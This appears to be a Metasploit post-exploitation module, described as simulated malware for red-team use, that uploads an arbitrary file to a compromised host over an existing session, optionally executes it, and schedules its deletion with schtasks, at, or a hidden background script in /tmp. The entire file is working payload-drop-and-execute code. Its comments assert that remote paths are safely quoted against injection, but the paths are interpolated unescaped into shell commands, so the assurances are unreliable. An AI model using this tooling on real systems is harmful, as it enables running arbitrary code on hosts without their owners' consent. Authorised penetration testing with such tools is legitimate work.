##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Multi Platform Time-Bomb File Dropper (Simulated Malware)',
        'Description' => %q{
          This module simulates malware file dropping behavior by uploading a file
          to the target system with an automatic self-destruct mechanism. The dropped
          file will be automatically deleted after a configurable time period.

          This is part of the simulated malware category for penetration testing,
          allowing testers to demonstrate file-based persistence without requiring
          manual cleanup. The file can be executed immediately or remain dormant
          until a scheduled time.

          SIMULATED MALWARE CATEGORY:
          Designed for penetration testing and red team exercises. Includes automatic
          cleanup to ensure dropped files are removed without manual intervention.

          Supports: Windows, Linux, macOS, Unix via Meterpreter or Shell sessions.
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Metasploit Framework' ],
        'Platform' => [ 'win', 'linux', 'osx', 'unix' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptPath.new('LOCAL_FILE', [true, 'Local file to upload to target']),
        OptString.new('REMOTE_PATH', [false, 'Remote path for dropped file (blank for temp directory)']),
        OptString.new('REMOTE_NAME', [false, 'Remote filename (blank to use local filename)']),
        OptInt.new('EXPIRATION_HOURS', [true, 'Hours until auto-cleanup (time bomb)', 24]),
        OptBool.new('EXECUTE_NOW', [true, 'Execute the file immediately after upload', false]),
        OptString.new('EXECUTE_ARGS', [false, 'Arguments to pass when executing the file']),
        OptBool.new('VERBOSE', [true, 'Verbose output', true])
      ]
    )
  end

  def run
    print_status("=" * 60)
    print_status("SIMULATED MALWARE: Time-Bomb File Dropper")
    print_status("=" * 60)
    print_warning("Dropped file will AUTO-DELETE after #{datastore['EXPIRATION_HOURS']} hours")
    print_status("=" * 60)

    # Validate local file
    local_file = datastore['LOCAL_FILE']
    unless ::File.exist?(local_file)
      print_error("Local file not found: #{local_file}")
      return
    end

    # Read file content
    begin
      file_content = ::File.binread(local_file)
      print_status("Read #{file_content.length} bytes from #{local_file}")
    rescue StandardError => e
      print_error("Failed to read local file: #{e.message}")
      return
    end

    # Detect platform
    platform = detect_platform
    unless platform
      print_error("Unable to detect platform")
      return
    end

    print_status("Detected platform: #{platform}")

    # Determine remote path
    remote_name = datastore['REMOTE_NAME'] || ::File.basename(local_file)
    remote_dir = datastore['REMOTE_PATH'] || get_temp_dir(platform)
    remote_path = build_remote_path(platform, remote_dir, remote_name)

    # Upload the file
    begin
      write_file(remote_path, file_content)
      print_good("File uploaded: #{remote_path} (#{file_content.length} bytes)")
    rescue StandardError => e
      print_error("Failed to upload file: #{e.message}")
      return
    end

    # Make executable on Unix-like systems
    if platform != 'windows'
      begin
        cmd_exec("chmod +x #{remote_path}")
        vprint_good("Set executable permissions")
      rescue StandardError => e
        vprint_error("Failed to set permissions: #{e.message}")
      end
    end

    # Execute if requested
    if datastore['EXECUTE_NOW']
      execute_file(platform, remote_path)
    end

    # Setup time-bomb cleanup
    schedule_cleanup(platform, remote_path)

    print_good("Time-bomb activated")
    print_status("Auto-cleanup scheduled for: #{Time.now + (datastore['EXPIRATION_HOURS'] * 3600)}")
    print_status("File will self-destruct after #{datastore['EXPIRATION_HOURS']} hours")
  end

  def detect_platform
    sysinfo = nil
    begin
      if session.type == 'meterpreter'
        sysinfo = session.sys.config.sysinfo
        os = sysinfo['OS']
      else
        # Shell session - try to detect via commands
        os = cmd_exec('uname -s 2>/dev/null || ver 2>/dev/null || echo unknown').to_s.strip
      end

      return 'windows' if os =~ /windows/i
      return 'linux' if os =~ /linux/i
      return 'osx' if os =~ /darwin/i || os =~ /mac/i
      return 'unix' if os =~ /bsd/i || os =~ /unix/i
    rescue StandardError => e
      vprint_error("Error detecting platform: #{e.message}")
    end

    nil
  end

  def get_temp_dir(platform)
    case platform
    when 'windows'
      if session.type == 'meterpreter'
        return session.sys.config.getenv('TEMP')
      else
        return cmd_exec('echo %TEMP%').strip
      end
    when 'linux', 'osx', 'unix'
      return '/tmp'
    end
  end

  def build_remote_path(platform, dir, filename)
    separator = platform == 'windows' ? '\\' : '/'
    "#{dir}#{separator}#{filename}"
  end

  def execute_file(platform, remote_path)
    exec_args = datastore['EXECUTE_ARGS'] || ''
    
    begin
      if platform == 'windows'
        cmd = "\"#{remote_path}\" #{exec_args}"
        print_status("Executing: #{cmd}")
        result = cmd_exec(cmd, nil, 10)
      else
        cmd = "#{remote_path} #{exec_args}"
        print_status("Executing: #{cmd}")
        result = cmd_exec(cmd, nil, 10)
      end
      
      if result && !result.empty?
        print_status("Execution output:")
        print_line(result)
      else
        print_good("File executed (no output)")
      end
    rescue StandardError => e
      print_error("Execution failed: #{e.message}")
    end
  end

  def schedule_cleanup(platform, remote_path)
    expiration_seconds = datastore['EXPIRATION_HOURS'] * 3600
    
    case platform
    when 'windows'
      schedule_windows_cleanup(remote_path, expiration_seconds)
    when 'linux', 'osx', 'unix'
      schedule_unix_cleanup(remote_path, expiration_seconds)
    end
  end

  def schedule_windows_cleanup(remote_path, expiration_seconds)
    # Create a scheduled task to delete the file
    expiration_minutes = expiration_seconds / 60
    task_name = "Cleanup_#{Rex::Text.rand_text_alpha(8)}"
    
    # Note: remote_path is user-controlled via datastore but is escaped with double quotes
    # Task name is alphanumeric only from rand_text_alpha, so it's safe
    # The path is properly escaped with \" inside the scheduled task command
    # Schedule task to run once after delay and delete the file
    cmd = "schtasks /Create /TN #{task_name} /TR \"cmd.exe /c del /F /Q \\\"#{remote_path}\\\" && schtasks /Delete /TN #{task_name} /F\" /SC ONCE /ST 00:00 /Z /V1 /SD #{(Time.now + expiration_seconds).strftime('%m/%d/%Y')} /F"
    
    begin
      result = cmd_exec(cmd)
      if result.to_s.downcase.include?('success') || result.to_s.empty?
        vprint_good("Cleanup scheduled (Task: #{task_name})")
      else
        vprint_warning("Scheduled task may have failed: #{result}")
      end
    rescue StandardError => e
      vprint_error("Failed to schedule cleanup: #{e.message}")
    end
  end

  def schedule_unix_cleanup(remote_path, expiration_seconds)
    # Create a self-deleting at job
    delay_minutes = expiration_seconds / 60
    
    # Use 'at' command to schedule deletion
    # Note: remote_path is user-controlled via REMOTE_PATH option, but is quoted to prevent injection
    cmd = "echo 'rm -f \"#{remote_path}\"' | at now + #{delay_minutes} minutes 2>&1"
    
    begin
      result = cmd_exec(cmd)
      if result.to_s.downcase.include?('job') || result.to_s.downcase.include?('warning: commands')
        vprint_good("Cleanup scheduled using 'at'")
      else
        # Fallback: Try cron with a one-time job
        vprint_warning("'at' command may not be available, trying alternative method")
        schedule_unix_cleanup_cron(remote_path, expiration_seconds)
      end
    rescue StandardError => e
      vprint_error("Failed to schedule cleanup: #{e.message}")
      # Try cron fallback
      schedule_unix_cleanup_cron(remote_path, expiration_seconds)
    end
  end

  def schedule_unix_cleanup_cron(remote_path, expiration_seconds)
    # Calculate the exact time for deletion
    cleanup_time = Time.now + expiration_seconds
    minute = cleanup_time.min
    hour = cleanup_time.hour
    day = cleanup_time.day
    month = cleanup_time.month
    
    # Create a one-time cron job
    # cleanup_script path is safe - uses only alphanumeric from rand_text_alpha
    cleanup_script = "/tmp/.cleanup_#{Rex::Text.rand_text_alpha(8)}.sh"
    
    # Use single quotes to prevent shell expansion and escaping issues
    # remote_path is quoted in the script to handle special characters
    script_content = <<~BASH
      #!/bin/bash
      sleep #{expiration_seconds}
      rm -f '#{remote_path}'
      crontab -l 2>/dev/null | grep -v '#{cleanup_script}' | crontab - 2>/dev/null
      rm -f '#{cleanup_script}'
    BASH
    
    begin
      write_file(cleanup_script, script_content)
      cmd_exec("chmod +x '#{cleanup_script}'")
      cmd_exec("nohup '#{cleanup_script}' >/dev/null 2>&1 &")
      vprint_good("Cleanup scheduled via background script")
    rescue StandardError => e
      vprint_error("Failed to create cleanup script: #{e.message}")
    end
  end
end
